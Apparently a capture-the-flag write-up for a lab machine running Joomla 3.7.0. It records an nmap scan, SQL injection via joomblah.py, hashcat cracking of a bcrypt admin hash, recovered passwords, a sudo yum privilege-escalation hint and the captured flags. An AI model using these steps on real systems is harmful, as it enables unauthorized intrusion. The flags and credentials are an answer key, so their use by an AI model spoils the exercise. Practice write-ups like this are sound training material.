## NMAP

nmap -sV -O -T4 -Pn 10.10.33.225 -oN nmap/initial

22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

## Gobuster scan

Nothing found

## Curl

Apache 2.4.6
PHP 5.6.40

Admin Page : /administrator/index.php

## Version

joomla 3.7.0 	SQLInjection

## Using joomblah.py

['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']

jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
jonah:spiderman123

bcrypt, Blowfish (Unix) hash

hashcat -a 0 -m 3200 hash.txt rackyou.txt ==> spiderman123

Admin POrtal Access : jonah:spiderman123

User : jjameson

Found : configuration.php in /var/www/html
Password : nv5uz9r3ZEDzVjNu

USer hash : 27a260fe3cba712cfdedb1c86d80442e

/usr/bin/yum can be run as root

Root flag : eec3d53292b1821868266858d7fa6f79